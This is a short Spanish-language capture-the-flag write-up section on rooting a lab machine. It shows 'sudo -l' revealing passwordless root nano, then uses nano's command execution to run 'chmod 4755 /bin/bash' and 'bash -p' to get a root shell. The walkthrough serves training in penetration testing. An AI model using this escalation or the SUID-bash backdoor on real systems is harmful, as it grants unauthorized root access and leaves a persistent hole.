## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar nano /opt/priv como el usuario root sin proporcionar contraseña.

```bash
sudo -u root nano /opt/priv

Ctrl+r
Ctrl+x

chmod 4755 /bin/bash

Enter
```

Ya podemos ver que la `/bin/bash` tiene privilegios SUID y que podemos convertirnos en root para leer la flag

```bash
ls -la /bin/bash
bash -p
whoami
#Output
root
```
